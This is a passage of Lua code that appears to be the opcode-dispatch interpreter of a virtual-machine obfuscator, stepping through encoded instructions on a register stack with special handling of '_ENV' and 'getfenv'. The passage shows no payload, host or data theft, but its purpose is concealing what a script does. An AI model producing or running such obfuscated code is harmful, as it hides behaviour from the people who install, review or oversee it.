                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                elseif (Enum == 176) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                else
                  local A;
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = {};
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  VIP = Inst[3];
                end
              elseif (Enum <= 178) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              elseif (Enum == 179) then
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              else
                local A;
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              end
            elseif (Enum <= 183) then
              if (Enum <= 181) then
                local Results;
                local Edx;
                local Results, Limit;
                local B;
                local A;
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Stk[A + 1]);
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Stk[A + 1]));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results = {Stk[A](Unpack(Stk, A + 1, Top))};
                Edx = 0;
                for Idx = A, Inst[4] do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                VIP = Inst[3];
              elseif (Enum == 182) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                local B;
                local A;
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              end
            elseif (Enum <= 184) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3] ~= 0;
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            elseif (Enum > 185) then
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
            elseif (Stk[Inst[2]] == Inst[4]) then
              VIP = VIP + 1;
            else
              VIP = Inst[3];
            end
          elseif (Enum <= 192) then
            if (Enum <= 189) then
              if (Enum <= 187) then
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Env[Inst[3]] = Stk[Inst[2]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Env[Inst[3]] = Stk[Inst[2]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              elseif (Enum > 188) then
                local B;
                local A;
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              else
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum <= 190) then
              Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
            elseif (Enum > 191) then
              local Results;
              local Edx;
              local Results, Limit;
              local B;
              local A;
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A](Stk[A + 1]);
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Stk[A + 1]));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results = {Stk[A](Unpack(Stk, A + 1, Top))};
              Edx = 0;
              for Idx = A, Inst[4] do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              VIP = Inst[3];
            else
              local B;
              local A;
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
            end
          elseif (Enum <= 195) then
            if (Enum <= 193) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3] ~= 0;
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
            elseif (Enum > 194) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            else
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3] ~= 0;
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
            end
          elseif (Enum <= 197) then
            if (Enum > 196) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
